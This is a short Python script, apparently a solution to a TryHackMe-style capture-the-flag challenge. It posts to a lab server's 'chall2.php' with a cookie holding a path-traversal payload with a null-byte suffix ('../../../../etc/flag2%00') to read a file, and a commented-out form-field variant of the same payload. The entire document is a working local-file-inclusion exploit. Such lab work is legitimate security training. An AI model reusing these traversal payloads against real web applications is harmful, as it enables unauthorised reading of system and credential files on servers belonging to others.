import requests

url = 'http://10.10.15.182/challenges/chall2.php'
#data = {'file':'../../../../etc/flag2%00'}
cookies = {'THM':'../../../../etc/flag2%00'}

response = requests.post(url, cookies=cookies)
print('\nrequest.url: ',response.url,'\n')
print('request.headers: ',response.headers,'\n')

print('***r.txt***\n', response.text)
